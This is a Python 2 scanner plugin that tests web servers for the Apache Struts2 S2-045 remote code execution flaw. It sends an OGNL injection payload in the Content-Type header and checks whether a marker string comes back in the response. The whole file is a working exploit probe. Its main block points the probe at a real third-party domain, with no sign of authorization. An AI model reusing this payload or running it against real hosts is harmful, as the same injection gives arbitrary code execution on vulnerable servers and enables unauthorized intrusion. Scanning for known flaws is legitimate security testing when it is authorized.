#!/usr/bin/env python
# encoding: utf-8
from ..t import T
# from t  import T
import requests
class P(T):
    def __init__(self):
        T.__init__(self)
        keywords=['struts']
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        target_url = ''
        target_url = 'http://' + ip + ':' + port

        if productname.get('path', ''):
            target_url = 'http://' + ip + ':' + port + productname.get('path', '')
        else:
            from script import linktool
            listarray = linktool.getaction(target_url)
            if len(listarray) > 0:
                target_url = listarray[0]
            else:
                target_url = 'http://' + ip + ':' + port + '/login.action'

        result = {}
        timeout=3
        result['result']=False
        res=None
        payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('123456789')).(#o.close())}"
        print target_url
        try:
            headers = {"Content-Type":payload}
            r = requests.get(target_url,headers=headers,timeout=5)
            res_html = r.text
        except Exception,e:
            print e
            return result
        finally:
            if res is not None:
                res.close()
                del res
        if res_html.find("123456789") <> -1:


            info = target_url + "struts045  Vul"
            result['result']=True
            result['VerifyInfo'] = {}
            result['VerifyInfo']['type']='struts045 Vul'
            result['VerifyInfo']['URL'] =target_url
            result['VerifyInfo']['payload']=payload
            result['VerifyInfo']['result'] =info
            return result
        return result

if __name__ == '__main__':
    print P().verify(ip='www.healthmanage.cn',port='80')
